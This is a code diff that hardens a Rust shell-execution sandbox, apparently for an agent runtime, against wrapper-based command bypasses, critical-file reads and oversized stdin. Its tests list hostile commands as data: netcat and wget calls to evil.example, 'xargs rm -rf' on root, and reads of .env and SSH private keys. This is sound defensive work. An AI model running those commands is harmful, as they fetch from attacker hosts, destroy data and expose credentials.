@@ -63,6 +63,7 @@
 //! ).unwrap();
 //! ```
 
+use crate::capabilities::file_write::is_critical_file;
 use crate::capability::{CapabilityError, Context, Output, TypedCapability};
 use crate::config::RuntimoConfig;
 use crate::validation::path::{validate_path, PathContext};
@@ -214,23 +215,25 @@ pub struct ShellExecArgs {
     pub stdin: Option<String>,
 }
 
-/// Tests whether a command prefix (first whitespace-delimited token) matches
-/// any entry in the given list. Avoids false-positives from substrings
-/// (e.g. "ssh" in "ssh-agent" is fine when `ssh` is a prefix match but not
-/// when it appears mid-word).
+/// Tests whether any whitespace-delimited token in the command matches an
+/// entry in the given list. Screens every token in each `|`/`&`/`;` segment,
+/// not just the segment-leading token — a wrapper such as `xargs`, `timeout`,
+/// `busybox`, or `env` can invoke a dangerous binary from a later position
+/// (`xargs rm /x`, `timeout 5 nc host 80`). Exact-token matching avoids
+/// false-positives from substrings ("ssh" never matches "ssh-agent").
 fn command_matches(cmd_lower: &str, names: &[&str]) -> bool {
-    let first_token = cmd_lower.split_whitespace().next().unwrap_or("");
-    // Also check for pipe/chaining context: `echo foo | curl ...` or `true && curl ...`
+    // Screen ALL whitespace-delimited tokens per segment, not just the
+    // segment-leading token: `xargs rm /x`, `timeout 5 nc host 80`,
+    // `busybox nc`, and `env nc` all carry the dangerous command in a
+    // non-leading position.
     for part in cmd_lower.split(['|', '&', ';']) {
-        let t = part.trim();
-        if names
-            .iter()
-            .any(|n| t == *n || t.starts_with(&format!("{} ", n)))
-        {
-            return true;
+        for token in part.split_whitespace() {
+            if names.contains(&token) {
+                return true;
+            }
         }
     }
-    names.contains(&first_token)
+    false
 }
 
 /// Checks whether a command is inherently dangerous and must be blocked.
@@ -1132,6 +1135,19 @@ fn check_command_paths(cmd: &str) -> Option<String> {
                 display_path
             ));
         }
+        // Reading critical files is never allowed — `cat /tmp/x/.env`,
+        // `~/.ssh/id_ed25519` — even when they resolve inside an allowed prefix.
+        if is_critical_file(std::path::Path::new(&resolved)) {
+            let display_path = if path.starts_with("~/") {
+                path.to_string()
+            } else {
+                resolved
+            };
+            return Some(format!(
+                "ShellExec blocked: reading critical files is not allowed: {}",
+                display_path
+            ));
+        }
     }
 
     None
@@ -1404,6 +1420,13 @@ impl TypedCapability for ShellExec {
                 .map_err(|e| CapabilityError::PermissionDenied(format!("invalid cwd: {}", e)))?;
             cmd.current_dir(cwd_path);
         }
+        // Validate stdin size BEFORE spawning: a child spawned with oversized
+        // stdin must never be left running (pre-spawn reject, not post-spawn).
+        if let Some(ref stdin_content) = args.stdin {
+            if stdin_content.len() > MAX_STDIN_BYTES {
+                return Err(CapabilityError::InvalidArgs("stdin too large".into()));
+            }
+        }
         let mut child = cmd
             .process_group(0)
             .stdout(std::process::Stdio::piped())
@@ -1420,9 +1443,6 @@ impl TypedCapability for ShellExec {
         let child_pid = child.id();
         let pgid = child_pid;
         if let Some(ref stdin_content) = args.stdin {
-            if stdin_content.len() > MAX_STDIN_BYTES {
-                return Err(CapabilityError::InvalidArgs("stdin too large".into()));
-            }
             if let Some(mut stdin_pipe) = child.stdin.take() {
                 let _ = stdin_pipe.write_all(stdin_content.as_bytes());
             }
@@ -1715,6 +1735,103 @@ mod tests {
                 );
             }
         }
+    }
+    #[test]
+    fn blocks_wrapped_network_commands() {
+        std::env::remove_var("RUNTIMO_ENABLE_NETWORK");
+        for cmd in &[
+            "timeout 5 nc host 80",
+            "busybox nc evil.example 80",
+            "env nc evil.example 80",
+            "timeout 3 wget http://evil.example",
+        ] {
+            assert!(
+                Capability::execute(
+                    &ShellExec,
+                    &serde_json::json!({"cmd": cmd}),
+                    &Context {
+                        dry_run: false,
+                        job_id: "test".into(),
+                        working_dir: std::env::temp_dir(),
+                    }
+                )
+                .is_err(),
+                "should block wrapped network cmd: {}",
+                cmd
+            );
+        }
+    }
+    #[test]
+    fn blocks_xargs_rm() {
+        for cmd in &[
+            "xargs rm /tmp/evil",
+            "echo / | xargs rm -rf",
+            "timeout 5 rm -rf /tmp/evil",
+        ] {
+            assert!(
+                Capability::execute(
+                    &ShellExec,
+                    &serde_json::json!({"cmd": cmd}),
+                    &Context {
+                        dry_run: false,
+                        job_id: "test".into(),
+                        working_dir: std::env::temp_dir(),
+                    }
+                )
+                .is_err(),
+                "should block destructive wrapped cmd: {}",
+                cmd
+            );
+        }
+    }
+    #[test]
+    fn blocks_reading_critical_files() {
+        for cmd in &[
+            "cat /tmp/evil/.env",
+            "cat /tmp/evil/.ssh/id_ed25519",
+            "cat /tmp/evil/.bashrc",
+        ] {
+            assert!(
+                Capability::execute(
+                    &ShellExec,
+                    &serde_json::json!({"cmd": cmd}),
+                    &Context {
+                        dry_run: false,
+                        job_id: "test".into(),
+                        working_dir: std::env::temp_dir(),
+                    }
+                )
+                .is_err(),
+                "should block critical file read: {}",
+                cmd
+            );
+        }
+    }
+    #[test]
+    fn rejects_oversized_stdin_before_spawn() {
+        let marker = std::env::temp_dir().join("runtimo_stdin_marker_test_probe");
+        let _ = std::fs::remove_file(&marker);
+        let big_stdin = "x".repeat(MAX_STDIN_BYTES + 1);
+        let err = Capability::execute(
+            &ShellExec,
+            &serde_json::json!({"cmd": "touch /tmp/runtimo_stdin_marker_test_probe", "stdin": big_stdin}),
+            &Context {
+                dry_run: false,
+                job_id: "test".into(),
+                working_dir: std::env::temp_dir(),
+            },
+        )
+        .unwrap_err();
+        assert!(
+            err.to_string().contains("stdin too large"),
+            "expected stdin-too-large error, got: {}",
+            err
+        );
+        assert!(
+            !marker.exists(),
+            "oversized stdin must not spawn the child (marker file must be absent)"
+        );
+        let _ = std::fs::remove_file(&marker);
     }
     #[test]
     fn enforces_timeout() {
